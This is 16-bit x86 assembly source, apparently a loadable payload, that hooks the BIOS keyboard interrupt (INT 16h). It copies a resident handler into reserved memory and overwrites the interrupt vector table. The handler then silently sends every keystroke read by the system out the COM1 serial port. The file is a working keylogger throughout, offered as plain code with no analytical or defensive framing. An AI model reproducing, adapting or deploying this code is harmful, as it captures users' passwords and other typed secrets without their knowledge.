[bits 16]

; Protocol data
dw 0xAABB
dw end - start

start:
    call .get_addr
    .get_addr:
        pop bp
        sub bp, .get_addr - start    

    ; Calculating source as reserved RAM area
    mov ax, 0x0040
    mov ds, ax
    mov ax, [ds:0x0013]        
    add ax, 0x2
    shl ax, 6
    mov es, ax

    ; Copying code to reserved RAM area
    mov cx, hook_end - keyboard_hook
    ; Source
    mov bx, cs
    mov ds, bx
    lea si, [bp + (keyboard_hook - start)]
    ; Destiny
    xor di, di
    ; Exec
    cld
    rep movsb

    ; IVT Segment (ds=0x0000)
    xor ax, ax
    mov ds, ax

    ; Saving old Keyboard int (0x16) at 0x58
    mov ax, [ds:0x0058]
    mov [es:(int16_bios_off - keyboard_hook)], ax
    mov ax, [ds:0x005a]
    mov [es:(int16_bios_seg - keyboard_hook)], ax

    ; Overwriting IVT
    mov ax, es
    mov word [ds:0x0058], 0x0000 ; Offset
    mov word [ds:0x005a], ax ; Segment

    ret

    keyboard_hook:
        push ax ; Saves OS calling params

        ; Doing post-int-chaining
        pushf
        call far [cs:(bios_old_vector - keyboard_hook)]

        pushf
        pusha

        ; Verifying int 'ah' param
        push bp
        mov bp, sp

        mov bx, [bp+20]
        cmp bh, 0x00
        je .send_byte
        cmp bh, 0x10
        je .send_byte

        jmp .done

        ; Behavior implementation
        .send_byte:
            push ax
            mov dx, 0x3fd
            .wait_tx:
                in al, dx
                test al, 0x20
                jz .wait_tx

                pop ax
                mov dx, 0x3f8
                out dx, al ; Writes on COM1

        .done:
            pop bp
            popa
            popf
            pop ax

            ; Stack patching
            push bp
            mov bp, sp
            pushf
            pop ax
            mov [bp+6], ax
            pop bp

            iret

        bios_old_vector:
            int16_bios_off dw 0
            int16_bios_seg dw 0
    hook_end:
end: